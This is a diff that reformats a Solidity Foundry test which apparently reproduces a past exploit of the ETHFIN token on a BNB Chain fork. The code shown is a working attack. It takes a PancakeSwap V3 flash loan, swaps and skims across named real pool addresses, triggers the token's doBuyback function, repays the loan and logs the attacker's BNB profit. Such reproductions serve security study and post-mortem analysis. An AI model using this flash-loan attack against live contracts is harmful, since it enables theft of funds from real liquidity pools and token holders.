@@ -15,15 +15,15 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x17bd2e09fa4585c15749f40bb32a6e3db58522ba#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface IETHFIN {
     function N_holders() external view returns (uint256);
     function NextBuybackMemberCount() external view returns (uint256);
-    function transfer(address, uint) external;
+    function transfer(address, uint256) external;
 }
 
 interface IPancakePool {
@@ -55,9 +55,8 @@ contract ETHFIN is BaseTestWithBalanceLog {
     address pancakeSwap2 = 0x168FDb7C2d4249485836595c8576D8f2D7c53a46; //ethfin-ethfin
     address pancakeSwap3 = 0x3544DA62afB297b5cE9DA14845C89b96D376D98C; //ethfin-wbnb
 
-
     function setUp() external {
-        cheats.createSelectFork("bsc", 37400485-1);
+        cheats.createSelectFork("bsc", 37_400_485 - 1);
         deal(address(ethfinToken), address(this), 1500); // initial tokens
     }
 
@@ -72,9 +71,14 @@ contract ETHFIN is BaseTestWithBalanceLog {
             holders = IETHFIN(ethfin).N_holders();
             base++;
         }
-        IPancakePool(pancakeV3Pool).flash(address(this), 0, 12000000000000000000, abi.encode(0x000000000000000000000000172fcd41e0913e95784454622d1c3724f546f849));
+        IPancakePool(pancakeV3Pool).flash(
+            address(this),
+            0,
+            12_000_000_000_000_000_000,
+            abi.encode(0x000000000000000000000000172fcd41e0913e95784454622d1c3724f546f849)
+        );
         uint256 after_attack = address(this).balance;
-        emit log_named_decimal_uint("Attacker BNB end exploited", after_attack-init, 18);
+        emit log_named_decimal_uint("Attacker BNB end exploited", after_attack - init, 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
@@ -82,20 +86,27 @@ contract ETHFIN is BaseTestWithBalanceLog {
         address[] memory path = new address[](2);
         path[0] = wbnbAddress;
         path[1] = eftoken;
-        uint256[] memory amounts = router.swapTokensForExactTokens(543357312592081354942659827, 12000000000000000000, path, pancakeSwap, block.timestamp + 120);
+        uint256[] memory amounts = router.swapTokensForExactTokens(
+            543_357_312_592_081_354_942_659_827, 12_000_000_000_000_000_000, path, pancakeSwap, block.timestamp + 120
+        );
         IPancakePair(pancakeSwap).skim(eftoken);
 
-        
-        uint256[] memory amounts2 = router.swapTokensForExactTokens(10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120);
+        uint256[] memory amounts2 = router.swapTokensForExactTokens(
+            10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120
+        );
         path[1] = ethfin;
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wbnb.balanceOf(address(this))-1000, 0, path, pancakeSwap2, block.timestamp + 120);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            wbnb.balanceOf(address(this)) - 1000, 0, path, pancakeSwap2, block.timestamp + 120
+        );
         IPancakePair(pancakeSwap2).skim(address(this));
-        
+
         bool status = IETHFINToken(ethfin).doBuyback();
         require(status, "Buyback failed");
 
         path[1] = eftoken;
-        uint256[] memory amounts3 = router.swapTokensForExactTokens(10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120);
+        uint256[] memory amounts3 = router.swapTokensForExactTokens(
+            10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120
+        );
         uint256 ethfin_balance = ethfinToken.balanceOf(address(this));
         IERC20(ethfin).transfer(pancakeSwap2, ethfin_balance);
         IPancakePair(pancakeSwap2).skim(pancakeSwap3);
@@ -106,10 +117,9 @@ contract ETHFIN is BaseTestWithBalanceLog {
         uint256[] memory amounts_out = router.getAmountsOut(ethfin_balance, path2);
         IPancakePair(pancakeSwap3).swap(0, amounts_out[1], address(this), "");
 
-        wbnb.transfer(pancakeV3Pool,12001200000000000000);
+        wbnb.transfer(pancakeV3Pool, 12_001_200_000_000_000_000);
         wbnb.withdraw(wbnb.balanceOf(address(this)));
     }
-
 
     fallback() external payable {}
 }
